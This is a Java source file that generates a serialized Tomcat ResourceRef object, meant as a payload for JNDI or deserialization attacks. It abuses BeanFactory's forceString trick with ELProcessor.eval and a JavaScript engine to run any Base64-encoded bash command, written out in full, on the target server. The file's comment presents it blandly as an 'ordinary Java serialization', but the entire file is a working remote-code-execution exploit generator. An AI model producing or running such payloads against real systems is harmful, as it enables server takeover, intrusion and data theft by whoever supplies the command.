import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;

/** Independent ordinary Java serialization of the documented ResourceRef/EL graph. */
public final class NativeBeanFactory {
  private static String quote(String value) { return "\"" + value.replace("\\", "\\\\").replace("\"", "\\\"") + "\""; }
  public static void main(String[] arguments) throws Exception {
    String encoded = Base64.getEncoder().encodeToString(arguments[0].getBytes(StandardCharsets.UTF_8));
    String script = "java.lang.Runtime.getRuntime().exec(Java.to(['/bin/bash','-c',String(new java.lang.String(java.util.Base64.getDecoder().decode('" + encoded + "')))],'java.lang.String[]')).waitFor()";
    String expression = "{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" + quote(script) + ")}";
    ResourceRef reference = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
    reference.add(new StringRefAddr("forceString", "x=eval"));
    reference.add(new StringRefAddr("x", expression));
    try (ObjectOutputStream stream = new ObjectOutputStream(new FileOutputStream(arguments[1]))) { stream.writeObject(reference); }
  }
}
